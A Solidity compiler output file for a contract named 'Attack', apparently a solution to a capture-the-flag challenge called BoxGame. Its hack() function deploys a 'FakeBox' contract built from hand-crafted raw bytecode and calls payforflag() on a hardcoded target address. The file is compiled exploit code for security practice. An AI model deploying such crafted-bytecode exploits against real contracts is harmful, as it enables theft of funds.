{
	"BoxGame/Attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"BoxGame/Attack.sol\":3479:3699  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"BoxGame/Attack.sol\":3525:3567  0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47 */\n  0x7ef2e0048f5baede046f6bf797943daf4ed8cb47\n    /* \"BoxGame/Attack.sol\":3501:3568  IBoxGame box = IBoxGame(0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"BoxGame/Attack.sol\":3479:3699  contract Attack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"BoxGame/Attack.sol\":3479:3699  contract Attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"BoxGame/Attack.sol\":3575:3697  function hack() public {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"BoxGame/Attack.sol\":3608:3623  FakeBox fakebox */\n      0x00\n        /* \"BoxGame/Attack.sol\":3626:3639  new FakeBox() */\n      mload(0x40)\n      tag_7\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create\n      dup1\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_9:\n      pop\n        /* \"BoxGame/Attack.sol\":3608:3639  FakeBox fakebox = new FakeBox() */\n      swap1\n      pop\n        /* \"BoxGame/Attack.sol\":3649:3652  box */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"BoxGame/Attack.sol\":3649:3663  box.payforflag */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc1803191\n        /* \"BoxGame/Attack.sol\":3680:3687  fakebox */\n      dup3\n        /* \"BoxGame/Attack.sol\":3649:3690  box.payforflag(payable(address(fakebox))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"BoxGame/Attack.sol\":3598:3697  {... */\n      pop\n        /* \"BoxGame/Attack.sol\":3575:3697  function hack() public {... */\n      jump\t// out\n    tag_8:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_15:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:243   */\n    tag_16:\n        /* \"#utility.yul\":184:191   */\n      0x00\n        /* \"#utility.yul\":213:237   */\n      tag_21\n        /* \"#utility.yul\":231:236   */\n      dup3\n        /* \"#utility.yul\":213:237   */\n      tag_15\n      jump\t// in\n    tag_21:\n        /* \"#utility.yul\":202:237   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":249:391   */\n    tag_17:\n        /* \"#utility.yul\":352:384   */\n      tag_23\n        /* \"#utility.yul\":378:383   */\n      dup2\n        /* \"#utility.yul\":352:384   */\n      tag_16\n      jump\t// in\n    tag_23:\n        /* \"#utility.yul\":347:350   */\n      dup3\n        /* \"#utility.yul\":340:385   */\n      mstore\n        /* \"#utility.yul\":249:391   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":397:651   */\n    tag_11:\n        /* \"#utility.yul\":506:510   */\n      0x00\n        /* \"#utility.yul\":544:546   */\n      0x20\n        /* \"#utility.yul\":533:542   */\n      dup3\n        /* \"#utility.yul\":529:547   */\n      add\n        /* \"#utility.yul\":521:547   */\n      swap1\n      pop\n        /* \"#utility.yul\":557:644   */\n      tag_25\n        /* \"#utility.yul\":641:642   */\n      0x00\n        /* \"#utility.yul\":630:639   */\n      dup4\n        /* \"#utility.yul\":626:643   */\n      add\n        /* \"#utility.yul\":617:623   */\n      dup5\n        /* \"#utility.yul\":557:644   */\n      tag_17\n      jump\t// in\n    tag_25:\n        /* \"#utility.yul\":397:651   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"BoxGame/Attack.sol\":2272:3400  contract FakeBox {... */\n          mstore(0x40, 0x80)\n            /* \"BoxGame/Attack.sol\":2329:3398  constructor() {... */\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n            /* \"BoxGame/Attack.sol\":3101:3167  0x7f00000000000100000000000000000000000000000000000000000000000000 */\n          0x7f00000000000100000000000000000000000000000000000000000000000000\n            /* \"BoxGame/Attack.sol\":3098:3099  0 */\n          0x00\n            /* \"BoxGame/Attack.sol\":3091:3168  mstore(0, 0x7f00000000000100000000000000000000000000000000000000000000000000) */\n          mstore\n            /* \"BoxGame/Attack.sol\":3194:3260  0x007f89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999 */\n          0x7f89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999\n            /* \"BoxGame/Attack.sol\":3188:3192  0x20 */\n          0x20\n            /* \"BoxGame/Attack.sol\":3181:3261  mstore(0x20, 0x007f89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999) */\n          mstore\n            /* \"BoxGame/Attack.sol\":3287:3353  0xb9e20160206000a1000000000000000000000000000000000000000000000000 */\n          0xb9e20160206000a1000000000000000000000000000000000000000000000000\n            /* \"BoxGame/Attack.sol\":3281:3285  0x40 */\n          0x40\n            /* \"BoxGame/Attack.sol\":3274:3354  mstore(0x40, 0xb9e20160206000a1000000000000000000000000000000000000000000000000) */\n          mstore\n            /* \"BoxGame/Attack.sol\":3377:3381  0x48 */\n          0x48\n            /* \"BoxGame/Attack.sol\":3374:3375  0 */\n          0x00\n            /* \"BoxGame/Attack.sol\":3367:3382  return(0, 0x48) */\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"BoxGame/Attack.sol\":2272:3400  contract FakeBox {... */\n              mstore(0x40, 0x80)\n              0x00\n              dup1\n              revert\n\n            auxdata: 0xa2646970667358221220bce7f817f4e15c785e54bc51c929a6d1dec630b9f1bbe908f86d9beb1e9af12d64736f6c63430008110033\n        }\n    }\n\n    auxdata: 0xa264697066735822122049a67d3c638a9271dbbbfc52b67a61e4d87e711392952c767065d60e236c60a464736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052737ef2e0048f5baede046f6bf797943daf4ed8cb476000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b50610215806100746000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80634de260a214610030575b600080fd5b61003861003a565b005b6000604051610048906100f5565b604051809103906000f080158015610064573d6000803e3d6000fd5b50905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c1803191826040518263ffffffff1660e01b81526004016100c09190610142565b600060405180830381600087803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b5050505050565b60828061015e83390190565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061012c82610101565b9050919050565b61013c81610121565b82525050565b60006020820190506101576000830184610133565b9291505056fe6080604052348015600f57600080fd5b507f7f000000000001000000000000000000000000000000000000000000000000006000527e7f89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f9996020527fb9e20160206000a100000000000000000000000000000000000000000000000060405260486000f3fea264697066735822122049a67d3c638a9271dbbbfc52b67a61e4d87e711392952c767065d60e236c60a464736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x7EF2E0048F5BAEDE046F6BF797943DAF4ED8CB47 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x215 DUP1 PUSH2 0x74 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD PUSH2 0x48 SWAP1 PUSH2 0xF5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x64 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC1803191 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC0 SWAP2 SWAP1 PUSH2 0x142 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x82 DUP1 PUSH2 0x15E DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12C DUP3 PUSH2 0x101 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13C DUP2 PUSH2 0x121 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x157 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x133 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH32 0x7F00000000000100000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH31 0x7F89814845D4EF05A4059F76EA572F39DF73FBE3D1C9B20F12B3B03D09F999 PUSH1 0x20 MSTORE PUSH32 0xB9E20160206000A1000000000000000000000000000000000000000000000000 PUSH1 0x40 MSTORE PUSH1 0x48 PUSH1 0x0 RETURN INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x49 0xA6 PUSH30 0x3C638A9271DBBBFC52B67A61E4D87E711392952C767065D60E236C60A464 PUSH20 0x6F6C634300081100330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "106600",
						"executionCost": "24420",
						"totalCost": "131020"
					},
					"external": {
						"hack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 142,
						"contract": "BoxGame/Attack.sol:Attack",
						"label": "box",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IBoxGame)136"
					}
				],
				"types": {
					"t_contract(IBoxGame)136": {
						"encoding": "inplace",
						"label": "contract IBoxGame",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}